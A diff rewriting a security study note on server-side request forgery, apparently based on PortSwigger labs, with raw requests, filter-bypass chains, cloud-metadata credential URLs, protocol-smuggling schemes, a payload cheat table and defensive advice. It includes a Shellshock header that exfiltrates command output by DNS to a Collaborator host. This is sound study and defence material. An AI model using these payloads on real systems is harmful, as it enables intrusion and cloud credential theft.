@@ -1,576 +1,216 @@
 # Server-Side Request Forgery (SSRF)
 
-**Category**: Server-Side Request Trust & URL Fetch Flaws  
-**Severity Focus**: High to Critical  
-**CWE Mapping**: CWE-918 (Primary), CWE-20, CWE-200, CWE-601, CWE-611, CWE-78  
-**OWASP Top 10 2021**: A10:2021-Server-Side Request Forgery (SSRF)
-**OWASP API Top 10 2023**: API7:2023-Server Side Request Forgery 
+**CWE-918** (also touches CWE-441 and CWE-611 when chained with XXE)
 
----
+## So what actually is SSRF?
 
-## What is SSRF?
+Basically, SSRF is when you trick the *server* into making a request on your behalf, to somewhere it shouldn't be going. You don't get the request yourself — the app does it for you, using its own network access, its own trust level.
 
-Server-side request forgery is a web security vulnerability that allows an attacker to induce the server-side application to make requests to an unintended location.   
-In an SSRF attack, the attacker abuses functionality on the server to read or update internal resources, and may be able to reach internal services, cloud metadata, or other protected back-end targets. 
+The dangerous part is the server usually has access to stuff you don't — internal admin panels, other internal services, cloud metadata, whatever. So if you can control the URL the server fetches, you basically get to use the server as a proxy into places you're not supposed to be.
 
----
+## Why does this matter / what can go wrong
 
-## Impact Overview
+- Server can be pointed at internal-only endpoints → access to admin functionality that's normally locked down
+- Can leak sensitive data (auth tokens, credentials, internal responses)
+- Can lead to full RCE in some cases if the internal service you reach is itself exploitable
+- Cloud metadata endpoints (`169.254.169.254`) are a huge target — get those IAM creds and you basically own the cloud account
+- Can be used to scan internal network / port scan stuff that's not exposed publicly
+- If it can reach external systems too, it can be abused to launch attacks that look like they're coming from the vulnerable org
 
-A successful SSRF attack can let an attacker access internal services, enumerate private infrastructure, bypass firewalls or VPN boundaries, and sometimes even trigger remote code execution on dependent systems.   
-If the application is allowed to reach cloud metadata services, the attacker may be able to steal temporary credentials or access tokens.   
-Blind SSRF can still be dangerous even when the response is hidden, because it can be used for port scanning, internal discovery, or out-of-band callbacks. 
+## SSRF against the server itself (loopback attacks)
 
----
+Classic case: app has some feature where it fetches a URL you give it. Like a "check stock" feature that hits an internal API.
 
-## Module 01: SSRF Fundamentals
-
-*   **CWE Mapping**: CWE-918 (Server-Side Request Forgery)
-*   **OWASP Top 10 Reference**: A10:2021-SSRF 
-
-### Low-Level Architectural Mechanics
-SSRF happens when server-side code fetches a resource based on attacker-controlled input. The server then becomes the trusted requester, which can bypass browser-only protections and network controls. 
-
-**Core abuse pattern**:
-- User supplies a URL, hostname, path, or callback target.
-- Server-side code issues the request.
-- The response may be returned to the user, stored, or used internally.
-- The attacker chooses a destination the server should never contact. 
-
-**Typical consequences**:
-- Internal admin page access.
-- Credential theft from metadata services.
-- Access to private back-end services.
-- Proxying malicious traffic through the victim server. 
-
-### Example SSRF Flow
-```python
-# ❌ VULNERABLE
-@app.route('/fetch')
-def fetch():
-    url = request.args.get('url')
-    return requests.get(url).text
+Normal request:
 ```
-
-### Raw SSRF Request
-```text
-GET /fetch?url=http://localhost/admin HTTP/1.1
-Host: vulnerable-app.com
-```
-
-### Secure Pattern
-```python
-# ✅ SECURE
-ALLOWED_HOSTS = {"api.partner.com"}
-
-@app.route('/fetch')
-def fetch():
-    url = request.args.get('url')
-    parsed = urlparse(url)
-    if parsed.scheme not in {"http", "https"}:
-        raise ValidationError("Scheme not allowed")
-    if parsed.hostname not in ALLOWED_HOSTS:
-        raise ValidationError("Host not allowed")
-    return requests.get(url, timeout=3, allow_redirects=False).text
-```
-
----
-
-## Module 02: SSRF Attack Surface Discovery
-
-*   **CWE Mapping**: CWE-918, CWE-200
-*   **OWASP Top 10 Reference**: A10:2021-SSRF 
-
-### Low-Level Architectural Mechanics
-SSRF often hides inside features that appear harmless but fetch remote content on the server side.   
-These features become attack surface whenever attacker input influences the destination URL or host. 
-
-**Common attack surface**:
-- Stock checks and inventory lookup.
-- URL previews and link unfurling.
-- PDF, image, or document fetchers.
-- Webhooks and callback handlers.
-- Import-by-URL features.
-- Analytics or logging systems that process request headers.
-- XML or structured-data parsers that resolve URLs. 
-
-### Common indicators
-- Parameters named `url`, `uri`, `next`, `path`, `stockApi`, `feed`, `callback`.
-- Timeouts, DNS lookups, or connection failures during input processing.
-- Error messages mentioning invalid host, connection refused, or parse failure. 
-
-### Secure Pattern
-```python
-# ✅ SECURE
-def is_safe_url(value):
-    parsed = urlparse(value)
-    return parsed.scheme in {"https"} and parsed.hostname in ALLOWED_HOSTS
-```
-
----
-
-## Module 03: SSRF Against the Local Server
-
-*   **CWE Mapping**: CWE-918
-*   **OWASP Top 10 Reference**: A10:2021-SSRF 
-
-### Low-Level Architectural Mechanics
-If the application fetches a URL supplied by the user, pointing it at `localhost` or `127.0.0.1` can make the server request its own local services. This can bypass browser-facing access controls because the request now originates from the trusted server network context. 
-
-### Raw Exploit Request
-```text
-POST /product/stock HTTP/1.1
-Host: vulnerable-app.com
+POST /product/stock HTTP/1.0
 Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
+
+stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
+```
+
+Now just... change the URL to point at the server's own loopback interface:
+```
+POST /product/stock HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
 
 stockApi=http://localhost/admin
 ```
 
-### Why It Works
-The local request may be treated as trusted by the target service, so administrative pages or debug interfaces become reachable even when they are not exposed externally. 
+And boom — the server fetches `/admin` for itself and hands you the response. Why does this work when you couldn't hit `/admin` directly as a normal user? Because a lot of apps implicitly trust anything coming from `localhost`. Some reasons this happens:
 
-### Secure Pattern
-```python
-# ✅ SECURE
-blocked_hosts = {"localhost", "127.0.0.1", "::1"}
+- access control is enforced by something sitting in front of the app (like a reverse proxy) — but when the app talks to itself, that layer gets skipped entirely
+- "break glass" recovery access — if you're on the box itself, you're assumed to be trusted (sysadmin recovering from lost creds etc.)
+- admin panel runs on a different port that's not meant to be reachable externally, so nobody bothered locking it down properly
 
-if parsed.hostname in blocked_hosts:
-    raise ValidationError("Local addresses are not allowed")
+This localhost-trust thing is honestly one of the most common reasons SSRF turns into something critical instead of just "meh."
+
+## SSRF against other internal systems (not just the server itself)
+
+Same idea, but instead of hitting `localhost`, you're hitting some other machine on the internal network — like `192.168.0.68`.
+
 ```
-
----
-
-## Module 04: SSRF Against Other Back-End Systems
-
-*   **CWE Mapping**: CWE-918
-*   **OWASP Top 10 Reference**: A10:2021-SSRF 
-
-### Low-Level Architectural Mechanics
-The application server may be able to reach private IP ranges and internal services that users cannot access directly. SSRF can therefore become a pivot into internal systems protected by topology rather than authentication. 
-
-**Common targets**:
-- `10.x.x.x`
-- `192.168.x.x`
-- `172.16.x.x` to `172.31.x.x`
-- Internal APIs.
-- Admin dashboards.
-- Service discovery endpoints. 
-
-### Raw Exploit Request
-```text
-POST /product/stock HTTP/1.1
-Host: vulnerable-app.com
+POST /product/stock HTTP/1.0
 Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
 
 stockApi=http://192.168.0.68/admin
 ```
 
-### Secure Pattern
-```python
-# ✅ SECURE
-def is_private_ip(hostname):
-    ip = socket.gethostbyname(hostname)
-    return ipaddress.ip_address(ip).is_private
+These internal boxes are often way less locked down because the assumption was "nobody outside can reach it anyway" — the network topology *was* the security. Once SSRF breaks that assumption, you're basically walking into unauthenticated internal admin panels.
+
+If you don't know the exact internal IP, you can just fuzz the last octet (1–255) using Burp Intruder and look for a response that stands out (a 200 where everything else 404s/times out, for example) — that's your live internal host.
+
+## Getting past filters people put in place
+
+### Blacklist filters (blocking known bad stuff like "localhost" or "admin")
+
+Devs will often try to block `127.0.0.1`, `localhost`, or the string `admin`. Cute, but blacklists are almost always incomplete. Some ways around them:
+
+- different representations of the same IP: `2130706433` (decimal), `017700000001` (octal), or just the shorthand `127.1`
+- register a domain that resolves to `127.0.0.1` — Burp Collaborator gives you `spoofed.burpcollaborator.net` for exactly this
+- URL-encode or case-vary the blocked string
+- IPv6 loopback tricks: `[::1]` or the IPv4-mapped `[::ffff:127.0.0.1]`
+- redirect chains — point at a URL you control that 302s to the real target; sometimes even switching protocol mid-redirect (http → https) slips past filters
+
+Real example of chaining bypasses together:
 ```
+http://127.0.0.1/          → blocked
+http://127.1/              → gets past the IP blacklist
+http://127.1/admin         → blocked again (string match on "admin")
+http://127.1/%2561dmin     → double-encoded "a" — filter checks the encoded string, 
+                              server decodes twice and it becomes /admin
+```
+
+That double-encoding trick is the kind of thing that works because the filter and the actual HTTP client don't decode things the same number of times. Filter sees garbage, thinks it's fine, back-end decodes it into something dangerous.
+
+### Whitelist filters (only allowing specific hosts)
+
+Harder to beat than a blacklist, but URL parsing is genuinely messy and different components parse URLs differently — that inconsistency is your way in.
+
+- credentials-in-URL trick: `https://expected-host:fakepassword@evil-host` — the whitelist regex might match on `expected-host` appearing early in the string, but the browser/HTTP client actually connects to `evil-host`
+- fragment trick: `https://evil-host#expected-host`
+- subdomain trick: `https://expected-host.evil-host` — technically contains the whitelisted string, but the actual host is `evil-host`
+- encode stuff, maybe even double-encode it, especially if the filter and the request-making code decode differently
+
+Real chain from a whitelist-filter scenario (whitelist only allows `stock.weliketoshop.net`):
+```
+http://127.0.0.1/                                        → rejected, not on the list
+http://username@stock.weliketoshop.net/                   → accepted — parser allows creds before @
+http://username@stock.weliketoshop.net/#                  → rejected once # is added
+http://username@stock.weliketoshop.net/%2523               → weird 500 error — interesting!
+http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
+```
+
+What's happening: the filter decodes `%2523` once and sees `%23` → treats it as still-encoded, passes it. The actual HTTP client double-decodes it into a literal `#`, which turns everything after it into a URL fragment — meaning the *real* host being requested is `localhost:80`, not `stock.weliketoshop.net` at all.
+
+### Bypassing filters using an open redirect elsewhere in the app
+
+If the whitelisted domain itself has an open redirect bug, you can smuggle your real target through it — assuming the code fetching the URL actually follows redirects (a lot of them do by default).
+
+Say there's an open redirect at:
+```
+/product/nextProduct?currentProductId=6&path=http://evil-user.net
+```
+
+You feed that whole thing into the vulnerable parameter:
+```
+stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
+```
+
+The filter checks `stockApi` → sees `weliketoshop.net` → totally allowed. App fetches it, hits the redirect, follows it straight into your internal target. Filter never even sees the real destination.
+
+## Blind SSRF — when you don't get the response back
+
+Sometimes you can *trigger* the request but you never see what came back. Way more annoying to confirm and exploit, but it's not useless — you just need out-of-band detection instead (Burp Collaborator basically).
+
+### Referer header is a sneaky one
+
+Analytics software on the back end sometimes visits whatever's in your `Referer` header — to check who's linking to them, scrape anchor text, whatever. If you control that header and it gets fetched server-side, that's SSRF.
+
+```
+GET /product?productId=1 HTTP/1.1
+Host: vulnerable-website.com
+Referer: http://YOUR-SUBDOMAIN.oastify.com
+```
+
+Nothing shows up in the response. You just poll your Collaborator listener afterward and — if it worked — you'll see a DNS/HTTP hit come in from the target's infrastructure. That confirms the blind SSRF even with zero visible feedback.
+
+### Taking it further — blind SSRF into RCE (Shellshock example)
+
+If the internal thing you're hitting blindly is itself vulnerable (old CGI script vulnerable to Shellshock, for instance), you can chain command execution on top of the blind SSRF and exfiltrate data purely through DNS.
+
+```
+User-Agent: () { :; }; /usr/bin/nslookup $(whoami).YOUR-SUBDOMAIN.oastify.com
+Referer: http://192.168.0.X:8080
+```
+
+The internal service processes that header, executes the shellshock payload, and the resulting DNS lookup literally contains the output of `whoami` as a subdomain. You watch your Collaborator log and read the username straight out of the DNS query. No response body needed at all — that's the beauty (and horror) of blind SSRF chained with OOB exfil.
+
+## Attack surface that's easy to miss
+
+- **partial URLs** — sometimes only a hostname or path fragment goes into the parameter, and it's stitched into a full URL server-side. Attack surface is there but you might not fully control the final URL.
+- **XML / XXE** — if the app parses XML and it's vulnerable to XXE, external entities can be used to trigger SSRF too. Worth checking any XML-accepting endpoint.
+- **cloud metadata endpoints** — this one's huge in real engagements:
+  ```
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/
+  ```
+  (AWS — note IMDSv2 requires a PUT to get a token first, which blocks naive SSRF unless the app happens to pass headers through). GCP needs a `Metadata-Flavor: Google` header, Azure needs `Metadata: true`. Get this right and you can walk away with live IAM credentials.
+- **protocol smuggling** — if the library making the request supports schemes beyond http/https, you can talk to totally different services:
+  - `file:///etc/passwd` — read local files if the library resolves it
+  - `gopher://internal-host:6379/_...` — craft raw bytes to speak Redis protocol, potentially get a webshell written to disk
+  - `dict://internal-host:11211/stat` — poke at Memcached
+- **file upload / rendering pipelines** — image/PDF/SVG processors that fetch remote resources. Classic SVG SSRF:
+  ```xml
+  <svg xmlns="http://www.w3.org/2000/svg">
+    <image xlink:href="http://169.254.169.254/latest/meta-data/" />
+  </svg>
+  ```
+  If the server renders this (thumbnail generation, PDF export, whatever), it'll fetch that URL for you.
+- **DNS rebinding** — sneaky TOCTOU bug. Domain resolves to a "safe" IP when the filter checks it, then you rebind the DNS record (short TTL) so by the time the actual request fires, it resolves to `127.0.0.1` or the metadata IP instead. Really hard to defend against with hostname-based filtering alone.
+
+## How you'd actually fix this (defender side)
+
+- whitelist the *exact* host/port/scheme needed — don't try to blacklist your way out of this
+- kill off schemes you don't need — only allow http/https, block file/gopher/dict/ftp
+- turn off automatic redirect-following on the back-end HTTP client
+- don't echo the raw response back to the user — removes a lot of the "easy win" cases
+- proper network segmentation — the app server shouldn't even be *able* to reach sensitive internal stuff or metadata endpoints, regardless of what the application layer filters
+- AWS specifically — enforce IMDSv2, makes naive metadata SSRF much harder
+- don't treat "request came from localhost" as inherently trustworthy — authenticate internal interfaces too
+
+## How this relates to other bug classes (so I stop mixing them up)
+
+| Bug | How it's different from SSRF |
+|---|---|
+| XXE | Attacks the XML parser directly; can be a *path into* SSRF, not the same thing |
+| Open Redirect | Redirects the victim's browser; SSRF can *use* one to dodge filters, but they're separate bugs |
+| CSRF | Forges a request from the victim's browser using their session; SSRF forges it from the server itself |
+| RFI | Server ends up including/executing remote code; can be where SSRF escalates *to* |
+
+## Quick reference
+
+| What | Payload example |
+|---|---|
+| Basic loopback | `http://localhost/admin`, `http://127.0.0.1/admin` |
+| Internal IP scan | `http://192.168.0.X:PORT/admin` (fuzz the octet) |
+| IP obfuscation | `2130706433`, `017700000001`, `127.1` |
+| Domain → localhost | `spoofed.burpcollaborator.net` |
+| Double-encode bypass | `%2561dmin` |
+| Open redirect chain | `/nextProduct?path=http://internal-ip/admin` |
+| Creds-in-URL bypass | `http://expected-host:pass@evil-host` |
+| Fragment bypass | `http://evil-host#expected-host` |
+| Subdomain bypass | `http://expected-host.evil-host` |
+| Referer-based blind SSRF | Collaborator payload in `Referer` header |
+| Blind SSRF → RCE | `() { :; }; /usr/bin/nslookup $(whoami).collab-domain` |
+| Cloud metadata | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` |
+| Protocol smuggling | `gopher://127.0.0.1:6379/_...` |
 
 ---
-
-## Module 05: Blacklist-Based Filter Bypass
-
-*   **CWE Mapping**: CWE-918, CWE-20
-*   **OWASP Top 10 Reference**: A10:2021-SSRF 
-
-### Low-Level Architectural Mechanics
-Blacklists are fragile because attackers can often reach the same destination through alternate IP encodings, obfuscation, or redirect chains. 
-
-**Common bypasses**:
-- `127.1` instead of `127.0.0.1`.
-- Decimal, octal, or hexadecimal IP forms.
-- URL encoding and double encoding.
-- Case variation.
-- Redirect chains through a controlled host. 
-
-### Raw Bypass Example
-```text
-POST /product/stock HTTP/1.1
-Host: vulnerable-app.com
-Content-Type: application/x-www-form-urlencoded
-
-stockApi=http://127.1/admin
-```
-
-### Secure Pattern
-```python
-# ✅ SECURE
-# Use allowlists rather than blacklists.
-if parsed.hostname not in {"stock.weliketoshop.net"}:
-    raise ValidationError("Host not allowed")
-```
-
----
-
-## Module 06: Whitelist-Based Filter Bypass
-
-*   **CWE Mapping**: CWE-918, CWE-20
-*   **OWASP Top 10 Reference**: A10:2021-SSRF 
-
-### Low-Level Architectural Mechanics
-Allowlist validation can still fail when the validation layer parses a URL differently than the request layer. URL syntax features such as embedded credentials, fragments, and encoding tricks can be abused. 
-
-**Bypass techniques**:
-- Embedded credentials: `user@host`.
-- Fragment tricks: `#`.
-- Subdomain confusion: `expected-host.attacker.com`.
-- URL encoding or double encoding.
-- Parser discrepancies between validation and the HTTP client. 
-
-### Raw Bypass Example
-```text
-POST /product/stock HTTP/1.1
-Host: vulnerable-app.com
-Content-Type: application/x-www-form-urlencoded
-
-stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
-```
-
-### Secure Pattern
-```python
-# ✅ SECURE
-def normalize_and_validate(url):
-    parsed = urlparse(url)
-    if parsed.username or parsed.password:
-        raise ValidationError("Credentials not allowed")
-    if parsed.fragment:
-        raise ValidationError("Fragments not allowed")
-    if parsed.hostname != "stock.weliketoshop.net":
-        raise ValidationError("Host not allowed")
-```
-
----
-
-## Module 07: Open-Redirect SSRF Bypass
-
-*   **CWE Mapping**: CWE-918, CWE-601
-*   **OWASP Top 10 Reference**: A10:2021-SSRF 
-
-### Low-Level Architectural Mechanics
-A supposedly allowed URL can redirect to an internal or attacker-chosen destination if the HTTP client follows redirects. This turns an allowlisted URL into a pivot point. 
-
-### Raw Exploit Request
-```text
-POST /product/stock HTTP/1.1
-Host: vulnerable-app.com
-Content-Type: application/x-www-form-urlencoded
-
-stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
-```
-
-### Secure Pattern
-```python
-# ✅ SECURE
-requests.get(url, allow_redirects=False, timeout=3)
-```
-
----
-
-## Module 08: Blind SSRF and Out-of-Band Detection
-
-*   **CWE Mapping**: CWE-918
-*   **OWASP Top 10 Reference**: A10:2021-SSRF 
-
-### Low-Level Architectural Mechanics
-Blind SSRF occurs when the server makes the request, but the response is not returned to the attacker. In that case, the attacker confirms behavior through DNS lookups, HTTP callbacks, timing differences, or other side effects. 
-
-**Detection signals**:
-- DNS lookup to attacker-controlled domain.
-- HTTP callback to Burp Collaborator.
-- Time delay or timeout.
-- Side effects in logs or telemetry. 
-
-### Raw Collaborator Probe
-```text
-GET /product/1 HTTP/1.1
-Host: vulnerable-app.com
-Referer: http://YOUR-COLLABORATOR-DOMAIN
-```
-
-### Secure Pattern
-```python
-# ✅ SECURE
-# Store headers as text; do not fetch them.
-analytics.log(request.headers.get("Referer"))
-```
-
----
-
-## Module 09: Blind SSRF via Shellshock
-
-*   **CWE Mapping**: CWE-918, CWE-78
-*   **OWASP Top 10 Reference**: A10:2021-SSRF 
-
-### Low-Level Architectural Mechanics
-If the internal target is vulnerable to Shellshock or another command execution bug, blind SSRF can be escalated into command execution. The attacker uses SSRF to deliver a crafted request and confirms impact through an out-of-band callback. 
-
-### Attack Flow
-1. Identify a blind SSRF sink.
-2. Force a request to an internal service on port 8080.
-3. Send a Shellshock-style payload in a header.
-4. Exfiltrate output via DNS or another callback. 
-
-### Secure Pattern
-```python
-# ✅ SECURE
-# Patch internal services and remove legacy shell parsing.
-```
-
----
-
-## Module 10: SSRF via Referer Header
-
-*   **CWE Mapping**: CWE-918, CWE-200
-*   **OWASP Top 10 Reference**: A10:2021-SSRF 
-
-### Low-Level Architectural Mechanics
-Analytics or logging systems may fetch URLs found in the `Referer` header. If they do this server-side, the header becomes an SSRF input surface. 
-
-### Raw Example
-```text
-GET /product/1 HTTP/1.1
-Host: vulnerable-app.com
-Referer: http://YOUR-COLLABORATOR-DOMAIN
-```
-
-### Impact
-- Blind confirmation via out-of-band traffic.
-- Internal analytics pivoting.
-- Secondary SSRF into internal dashboards. 
-
-### Secure Pattern
-```python
-# ✅ SECURE
-# Log the header; do not fetch it.
-analytics.log(request.headers.get("Referer"))
-```
-
----
-
-## Module 11: SSRF via XML and Data Parsers
-
-*   **CWE Mapping**: CWE-918, CWE-611
-*   **OWASP Top 10 Reference**: A10:2021-SSRF 
-
-### Low-Level Architectural Mechanics
-Structured formats may permit URLs that parsers resolve automatically. XML is the classic example, and SSRF can appear through external entity resolution or similar fetch behavior. 
-
-**Attack surface**:
-- XML imports.
-- Feed parsers.
-- Document importers.
-- Rich-content previewers. 
-
-### Secure Pattern
-```python
-# ✅ SECURE
-parser = XMLParser(resolve_entities=False, no_network=True)
-```
-
----
-
-## Module 12: SSRF to Cloud Metadata Services
-
-*   **CWE Mapping**: CWE-918, CWE-200
-*   **OWASP Top 10 Reference**: A10:2021-SSRF 
-
-### Low-Level Architectural Mechanics
-Cloud environments expose metadata and identity services that may return credentials, instance details, or access tokens. SSRF to these endpoints is often one of the highest-impact outcomes. 
-
-**Examples**:
-- AWS instance metadata.
-- GCP metadata service.
-- Azure metadata endpoint. 
-
-### Impact
-- Temporary cloud credentials.
-- Access tokens.
-- Instance identity.
-- Cloud privilege escalation. 
-
-### Secure Pattern
-```python
-# ✅ SECURE
-blocked_ips = {"169.254.169.254"}
-```
-
----
-
-## Module 13: SSRF Using Alternate Protocols
-
-*   **CWE Mapping**: CWE-918, CWE-20
-*   **OWASP Top 10 Reference**: A10:2021-SSRF 
-
-### Low-Level Architectural Mechanics
-Some libraries support non-HTTP protocols. If the application accepts a URL without restricting schemes, attackers may abuse `file://`, `gopher://`, or similar handlers depending on the environment. 
-
-**Risks**:
-- Local file access.
-- Protocol smuggling.
-- Raw socket-style behavior through URL handlers. 
-
-### Secure Pattern
-```python
-# ✅ SECURE
-allowed_schemes = {"http", "https"}
-if parsed.scheme not in allowed_schemes:
-    raise ValidationError("Scheme not allowed")
-```
-
----
-
-## Module 14: DNS Rebinding and Resolver Quirks
-
-*   **CWE Mapping**: CWE-918, CWE-20
-*   **OWASP Top 10 Reference**: A10:2021-SSRF 
-
-### Low-Level Architectural Mechanics
-Validation may happen against one DNS answer, while the actual HTTP request resolves to another. DNS rebinding and resolver inconsistencies can break hostname-based defenses. 
-
-**Risk factors**:
-- Hostname validation before resolution.
-- Different DNS contexts.
-- Cached versus live IP mismatches.
-- Short TTL records. 
-
-### Secure Pattern
-```python
-# ✅ SECURE
-# Resolve once, validate the resolved IP, then connect.
-```
-
----
-
-## Module 15: SSRF Through URL Preview and Fetchers
-
-*   **CWE Mapping**: CWE-918, CWE-200
-*   **OWASP Top 10 Reference**: A10:2021-SSRF 
-
-### Low-Level Architectural Mechanics
-Link previews, image importers, and webhook validators often fetch remote content server-side. These features are common SSRF sinks because they are expected to retrieve untrusted URLs. 
-
-**Examples**:
-- Link previews.
-- Image import.
-- Document fetching.
-- Webhook validation.
-- Import-from-URL tools. 
-
-### Secure Pattern
-```python
-# ✅ SECURE
-# Fetch only from trusted domains and cache results.
-```
-
----
-
-## Module 16: SSRF Chaining into Internal Pivoting
-
-*   **CWE Mapping**: CWE-918, CWE-200
-*   **OWASP Top 10 Reference**: A10:2021-SSRF 
-
-### Low-Level Architectural Mechanics
-SSRF is often more dangerous when chained with other issues. An attacker can pivot from one internal host to another, discover admin endpoints, or reach management ports. 
-
-**Chaining examples**:
-- SSRF to internal admin panel.
-- SSRF to metadata service.
-- SSRF to internal API docs.
-- SSRF to another vulnerable internal service. 
-
-### Secure Pattern
-```python
-# ✅ SECURE
-# Combine allowlists, egress filtering, timeouts, and logging.
-```
-
----
-
-## Module 17: SSRF Testing Workflow
-
-*   **CWE Mapping**: CWE-918, CWE-20
-*   **OWASP Top 10 Reference**: A10:2021-SSRF 
-
-### Low-Level Architectural Mechanics
-To test for SSRF, first identify a request that contains a full or partial URL, then probe whether the server issues a backend request based on that input. Burp Suite can be used to vary the destination host, test private ranges, and observe response differences. 
-
-**Practical testing steps**:
-1. Identify a URL-like input or header.
-2. Replace the destination with a controlled host.
-3. Try `localhost`, `127.0.0.1`, and internal IP ranges.
-4. Test for alternate IP forms and encoding tricks.
-5. Check for different status codes, response lengths, or delays.
-6. Use Collaborator or DNS callbacks for blind cases. 
-
-### Example Probe Pattern
-```text
-GET /fetch?url=http://YOUR-COLLABORATOR-DOMAIN HTTP/1.1
-Host: vulnerable-app.com
-```
-
-### Secure Pattern
-```python
-# ✅ SECURE
-# Log outbound destinations and alert on unexpected hosts.
-```
-
----
-
-## Module 18: SSRF Defensive Checklist
-
-*   **CWE Mapping**: CWE-918, CWE-20
-*   **OWASP Top 10 Reference**: A10:2021-SSRF 
-
-### Low-Level Architectural Mechanics
-SSRF should be handled with defense in depth rather than a single filter. OWASP recommends positive allowlists, disabling redirects, validating URL consistency, and applying network-layer controls such as deny-by-default egress filtering. 
-
-**Checklist**:
-- Validate and normalize the destination URL.
-- Restrict schemes to `http` and `https`.
-- Use allowlists for host, port, and destination.
-- Block loopback, private, link-local, and metadata IPs.
-- Disable redirects for untrusted fetches.
-- Never return raw remote responses blindly.
-- Enforce egress firewall policy.
-- Log accepted and blocked outbound connections.
-- Avoid putting sensitive services on front-end hosts. 
-
-### Secure Pattern
-```python
-# ✅ SECURE
-def safe_fetch(url):
-    parsed = urlparse(url)
-    if parsed.scheme not in {"http", "https"}:
-        raise ValidationError("Invalid scheme")
-    if parsed.hostname not in ALLOWED_HOSTS:
-        raise ValidationError("Host not allowed")
-    return requests.get(url, allow_redirects=False, timeout=3).text
-```
-
----
-
-## Detection Workflow
-
-### Step 1: Find URL Inputs
-Look for parameters like `url`, `next`, `path`, `stockApi`, `callback`, and `referer`. Check forms, JSON, headers, XML, and server-side import features. 
-
-### Step 2: Test for Fetching Behavior
-Replace the host with controlled domains, `localhost`, `127.0.0.1`, and private IPs. Watch for timeouts, redirects, DNS lookups, and unusual server errors. 
-
-### Step 3: Check for Bypasses
-Try alternate IP forms, redirect chaining, URL encoding, double encoding, embedded credentials, and parser edge cases. 
-
-### Step 4: Confirm Blind SSRF
-Use Burp Collaborator or a controlled DNS endpoint and watch for DNS and HTTP interactions. Timing differences can also confirm behavior. 
-
-### Step 5: Assess Impact
-Determine whether the issue reaches internal admin access, metadata services, credential theft, or command execution through a back-end service. 
-
----
+**Refs:**
+- [PortSwigger: Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)
+- [PortSwigger: Finding and exploiting blind SSRF vulnerabilities](https://portswigger.net/web-security/ssrf/blind)
+- [PortSwigger: A new era of SSRF](https://portswigger.net/blog/top-10-web-hacking-techniques-of-2017#1)
+- [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
